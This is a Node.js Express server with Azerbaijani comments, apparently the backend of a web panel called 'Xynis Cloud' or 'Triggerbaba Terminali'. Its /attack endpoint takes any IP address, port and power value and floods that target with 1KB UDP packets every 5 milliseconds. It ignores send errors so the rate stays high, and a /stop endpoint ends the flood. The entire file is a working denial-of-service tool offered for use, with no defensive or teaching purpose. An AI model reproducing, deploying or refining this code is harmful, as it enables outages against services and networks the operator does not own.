const express = require('express');
const dgram = require('dgram');
const app = express();
const client = dgram.createSocket('udp4');

app.use(express.json());
app.use(express.static('public')); // HTML faylların 'public' qovluğunda olsun

let attackInterval;

// Paket Atma Funksiyası
function startFlood(ip, port, power) {
    const message = Buffer.alloc(1024, 'X'); // 1KB-lıq ağır paket
    
    attackInterval = setInterval(() => {
        for (let i = 0; i < power * 10; i++) { // Power-ə görə sürəti nizamla
            client.send(message, 0, message.length, port, ip, (err) => {
                // Səhvləri görməzdən gəlirik ki, sürət düşməsin
            });
        }
    }, 5); // Çox qısa fasilə (5ms)
}

// Saytdan gələn əmri qəbul edən hissə
app.post('/attack', (req, res) => {
    const { ip, port, power } = req.body;
    
    if (attackInterval) clearInterval(attackInterval);
    
    console.log(`[Xynis Cloud] Hədəf: ${ip}:${port} | Güc: ${power}`);
    startFlood(ip, parseInt(port), parseInt(power));
    
    res.json({ status: "success", message: "Packets sending..." });
});

// Hücumu dayandırmaq üçün
app.post('/stop', (req, res) => {
    clearInterval(attackInterval);
    console.log("[Xynis Cloud] Hücum dayandırıldı.");
    res.json({ status: "stopped" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Triggerbaba Terminali ${PORT} portunda aktivdir.`);
});
